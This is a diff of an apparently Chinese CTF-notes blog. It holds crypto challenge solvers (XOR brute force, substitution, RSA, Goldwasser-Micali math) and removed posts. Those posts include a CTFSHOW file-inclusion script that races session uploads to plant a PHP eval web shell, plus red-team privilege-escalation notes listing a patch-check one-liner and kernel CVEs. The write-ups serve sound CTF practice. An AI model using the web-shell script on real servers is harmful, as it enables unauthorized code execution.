class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">        ct += encipher(plaintext[i:i + <span class="built_in">len</span>(key)], key)</span><br><span class="line">        i += <span class="built_in">len</span>(key)</span><br><span class="line">        rekey(key)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key,f</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">255</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">                tmp_key = key + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="built_in">print</span>(tmp_key)</span><br><span class="line">                <span class="comment">#assert len(tmp_key) == 8</span></span><br><span class="line">                start = <span class="number">0</span></span><br><span class="line">                ct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> start &lt; <span class="built_in">len</span>(f):</span><br><span class="line">                    ct += encipher(f[start:start + <span class="built_in">len</span>(tmp_key)], tmp_key)</span><br><span class="line">                    start += <span class="built_in">len</span>(key)</span><br><span class="line">                    rekey(key)</span><br><span class="line">                <span class="comment"># print(ct)</span></span><br><span class="line">                f2.write(ct)</span><br><span class="line">                f2.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span>(encrypt(ct,tmp_key)==f):</span><br><span class="line">                    <span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypt(key,f)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">s1,s2</span>):</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(s1,s2):</span><br><span class="line">        a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rekey</span>(<span class="params">key</span>):</span><br><span class="line">    k = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(key)-<span class="number">1</span>:</span><br><span class="line">            k += c</span><br><span class="line">            k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="built_in">ord</span>(key[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k += c</span><br><span class="line">            k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="built_in">ord</span>(key[i+<span class="number">1</span>]))</span><br><span class="line">    key = k</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>).read()</span><br><span class="line">chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> chars:</span><br><span class="line">        key = xor(<span class="string">&#x27;hope&#123;&#x27;</span>+j+l+<span class="string">&#x27;y&#x27;</span>, f[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        pt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(f):</span><br><span class="line">            pt += xor(f[i:i+<span class="built_in">len</span>(key)],key)</span><br><span class="line">            i += <span class="built_in">len</span>(key)</span><br><span class="line">            rekey(key)</span><br><span class="line">        <span class="built_in">print</span>(j+l)</span><br><span class="line">        <span class="built_in">print</span>(pt)</span><br><span class="line">        <span class="comment">#hope&#123;maybe_1_sh0ulD_h4v3_h1R3d_4_5p3c1471st_5tgkjs3bgRh&#125;</span></span><br></pre></td></tr></table></figure>
+<p>官方wp似乎也没有找到flag，这个题在我的电脑上好像坏掉了。</p>
 <h2 id="6-replacement"><a href="#6-replacement" class="headerlink" title="6.replacement"></a>6.replacement</h2><p>题如其名，高级的替代密码，将打乱的明文告诉了我们。关键就在于找出密文跟明文的对应关系。而且本题还加大了难度，映射表有41个字符…..</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;text.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    plaintext = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    plaintext += <span class="string">&#x27;\n&#x27;</span> + f.read()</span><br><span class="line"></span><br><span class="line">characters = <span class="built_in">set</span>(plaintext) - &#123;<span class="string">&#x27;\n&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">shuffled = <span class="built_in">list</span>(characters)</span><br><span class="line">random.shuffle(shuffled)</span><br><span class="line"></span><br><span class="line">replacement = <span class="built_in">dict</span>(<span class="built_in">zip</span>(characters, shuffled))</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&#x27;&#x27;</span>.join(replacement.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ciphertext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="7-small-fortune"><a href="#7-small-fortune" class="headerlink" title="7.small-fortune"></a>7.small-fortune</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> legendre</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">x = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">while</span> legendre(x, p) != -<span class="number">1</span> <span class="keyword">or</span> legendre(x, q) != -<span class="number">1</span>:</span><br><span class="line">    x = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gm_encrypt</span>(<span class="params">msg, n, x</span>):</span><br><span class="line">    y = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line">    enc = []</span><br><span class="line">    <span class="keyword">while</span> msg:</span><br><span class="line">        bit = msg &amp; <span class="number">1</span></span><br><span class="line">        msg &gt;&gt;= <span class="number">1</span></span><br><span class="line">        enc.append((<span class="built_in">pow</span>(y, <span class="number">2</span>) * <span class="built_in">pow</span>(x, bit)) % n)</span><br><span class="line">        y += getRandomRange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x =&quot;</span>, x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, gm_encrypt(flag, n, x))</span><br></pre></td></tr></table></figure>
-
+<p>首先有256bits的$n=pq$ 和一个随机数$x$（二次剩余的部分好像用不到）当作公钥，然后加密流程是先生成一个未知的随机数$y$，之后bit bit bit 加密：</p>
+<p>$c_i \equiv y_i^2x^{b_i}(\mod n)$</p>
+<p>其中的$y<em>0=y,y_i=y</em>{i-1}+d_i$ ，且 $d_i$是$2^{48}$以内的随机数。</p>
+<p>首先是假定<code>flag.txt</code>里面的flag格式是<code>hope&#123;....&#125;</code>且在最后没有换行，那么我们知道$b_0=1,b_1=0$。从这边可以列出两个等式：</p>
+<p>$c_0\equiv y^2x^{b_0}\equiv y^2x \space(\mod n)$</p>
+<p>$c1\equiv (y+d1)^2x^{b_0}\equiv(y+d_1)^2 (\mod n)$</p>
+<p>分别移项可以得到两个多项式$f(y,d_1),g(y,d_1)$，用resultant可得$h=Res_y(f,g)$是个$d_1$的四次多项式。 0</p>
+<h2 id="8-streamlined"><a href="#8-streamlined" class="headerlink" title="8.streamlined"></a>8.streamlined</h2>
       
     </div>
 
@@ -324,214 +522,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/22/Hackazon-Portal-CTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/22/Hackazon-Portal-CTF/" class="post-title-link" itemprop="url">Hackazon_Portal-CTF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-07-22 22:59:31 / 修改时间：23:15:46" itemprop="dateCreated datePublished" datetime="2022-07-22T22:59:31+08:00">2022-07-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>D</p>
-<h2 id="1-SECRET-CONVE-RSA-TIONS"><a href="#1-SECRET-CONVE-RSA-TIONS" class="headerlink" title="1.SECRET CONVE.RSA.TIONS"></a>1.SECRET CONVE.RSA.TIONS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N = 5261933844650100908430030083398098838688018147149529533465444719385566864605781576487305356717074882505882701585297765789323726258356035692769897420620858774763694117634408028918270394852404169072671551096321238430993811080749636806153881798472848720411673994908247486124703888115308603904735959457057925225503197625820670522050494196703154086316062123787934777520599894745147260327060174336101658295022275013051816321617046927321006322752178354002696596328204277122466231388232487691224076847557856202947748540263791767128195927179588238799470987669558119422552470505956858217654904628177286026365989987106877656917</span><br><span class="line">E = 65537</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to HackyHolidays! Your Supersecret flag is 176955087574615470063741472647197409875117482285309340581271852382710990213049325727125711804231234813146490233229473679126800639397642380073858980601348297248196895714845780751708931869367483971257602632592317987276609144131149239628356913355893753937582033295526684103570648143766629320982809943886265840131929175495923219383837739522744946987913271495217642469261483099144404131616847257182856944641353523297845726161862062019653065904612865722942649827600090466968124488518262272506900322544403300651512798674316560281124899873116026534973842919190849918357740307152880452169695889599662477611952919511642717417</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p=72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779768486519862521371761417707655650528352916168732086751886502287478577426433344249124093776641317837723657300923622528678618140782421245730805689484709681027</span><br><span class="line">N = 5261933844650100908430030083398098838688018147149529533465444719385566864605781576487305356717074882505882701585297765789323726258356035692769897420620858774763694117634408028918270394852404169072671551096321238430993811080749636806153881798472848720411673994908247486124703888115308603904735959457057925225503197625820670522050494196703154086316062123787934777520599894745147260327060174336101658295022275013051816321617046927321006322752178354002696596328204277122466231388232487691224076847557856202947748540263791767128195927179588238799470987669558119422552470505956858217654904628177286026365989987106877656917</span><br><span class="line">e = 65537</span><br><span class="line">c=176955087574615470063741472647197409875117482285309340581271852382710990213049325727125711804231234813146490233229473679126800639397642380073858980601348297248196895714845780751708931869367483971257602632592317987276609144131149239628356913355893753937582033295526684103570648143766629320982809943886265840131929175495923219383837739522744946987913271495217642469261483099144404131616847257182856944641353523297845726161862062019653065904612865722942649827600090466968124488518262272506900322544403300651512798674316560281124899873116026534973842919190849918357740307152880452169695889599662477611952919511642717417</span><br><span class="line">q = N//p</span><br><span class="line">assert p*q == N</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">assert isPrime(p)</span><br><span class="line">assert isPrime(q)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c,d,N)</span><br><span class="line">assert pow(m,e,N)==c</span><br><span class="line">print(m)</span><br><span class="line">m1 = long_to_bytes(m)</span><br><span class="line">print(m1)</span><br></pre></td></tr></table></figure>
-<p>求出明文但是flag不对……</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/22/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/22/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">CTFSHOW-文件包含</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-07-22 20:47:49 / 修改时间：22:01:47" itemprop="dateCreated datePublished" datetime="2022-07-22T20:47:49+08:00">2022-07-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>d</p>
-<p>CTFSHOW的文件包含的练习笔记。</p>
-<h2 id="第82关"><a href="#第82关" class="headerlink" title="第82关"></a>第82关</h2><p>这一关把点号禁用了，不可以用日志文件包含了。看答案是session文件包含。</p>
-<p>答案：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
-<p>背后的思想就是利用session.upload_progress将恶意语句写入session文件，随后包含session文件。所以我们需要知道session文件的路径。</p>
-<p>但是还有一些细节的问题没有分析，比如</p>
-<p>1.session文件在没有调用session_start()的情况下如何生成? </p>
-<p>2.生成了session文件，里面的内容在上传结束后会立即被清空，这时候又该如何做？</p>
-<p>第一个问题有两种解决的办法：</p>
-<p>1.如果session.auto_start=On,则php在接受请求的时候会自动初始化Session，不需要执行session_start()。但是默认情况下，这个选项都是关闭的。</p>
-<p>2.session还有一个默认选择，session.use_strict_mode默认值为0，此时用户可以自己定义Session ID。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO。即使此时用户没有初始化Session，PHP也会自动初始化Session，并产生一个键值，这个键值由ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，并且这个键值会被写入到sess_xxxx文件里。</p>
-<p>所以我们可以控制这个键值，然后包含这个session文件，跟日志文件包含差不多，但是区别的地方在于session文件包含需要一个条件竞争的过程，因为我们往这个session里面写入的键值会在上传完成后被清除掉，所以我们需要不断地请求包含这个session文件才行。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://906ae089-4bd0-46de-afad-dcfedd102d57.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid, data=data,</span><br><span class="line">                                cookies=&#123;</span><br><span class="line">                                    <span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid</span><br><span class="line">                                &#125;</span><br><span class="line">                                )</span><br><span class="line">        response2 = session.get(url + <span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response2.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++++++++done++++++++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    evnet = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B/" class="post-title-link" itemprop="url">渗透测试学习历程</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-07-22 09:34:37 / 修改时间：09:43:47" itemprop="dateCreated datePublished" datetime="2022-07-22T09:34:37+08:00">2022-07-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>D</p>
-<h1 id="红队渗透测试学习历程"><a href="#红队渗透测试学习历程" class="headerlink" title="红队渗透测试学习历程"></a>红队渗透测试学习历程</h1><h2 id="第一课：windows提权-快速查找exp"><a href="#第一课：windows提权-快速查找exp" class="headerlink" title="第一课：windows提权-快速查找exp"></a>第一课：windows提权-快速查找exp</h2><p>时刻关注微软官方的安全公告，通过这个办法来了解最近windows新出了什么漏洞，然后定位漏洞的名字，快速寻找相应的exp；最后用到渗透测试上我们就可以快速查找某主机是否打了补丁。</p>
-<p>在命令行下执行检测未打补丁的命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799</span><br><span class="line">KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904</span><br><span class="line">KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i</span><br><span class="line">&quot;%i&quot;|| @echo %i you can fuck)&amp;del /f /q /a micropoor.txt</span><br></pre></td></tr></table></figure>
-<p>注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删。</p>
-<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>一般在实战中在类似tmp目录等可写目录下执行：如<code>C:\tmp&gt;</code></p>
-<h2 id="第二课：Linux提权-依赖exp篇"><a href="#第二课：Linux提权-依赖exp篇" class="headerlink" title="第二课：Linux提权-依赖exp篇"></a>第二课：Linux提权-依赖exp篇</h2><p>直接查找exp然后进行提权即可</p>
-<p>exp注：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)</span><br><span class="line">CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]</span><br><span class="line">CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4/4.5.10/4.4.14)</span><br><span class="line">CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)</span><br><span class="line">CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)</span><br><span class="line">CVE-2017-5123 [&#x27;waitid()&#x27;] (Kernel 4.14.0-rc4+)</span><br><span class="line">CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)</span><br><span class="line">CVE-2016-5195 [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007))</span><br><span class="line">CVE-2016-2384 [a double-free in USB MIDI driver]  (Linux kernel before 4.5)</span><br><span class="line">CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)</span><br><span class="line">CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)</span><br><span class="line">CVE-2014-5284 [OSSEC] (2.8)</span><br><span class="line">CVE-2014-4699 [ptrace] (before 3.15.4)</span><br><span class="line">CVE-2014-4014 [Local 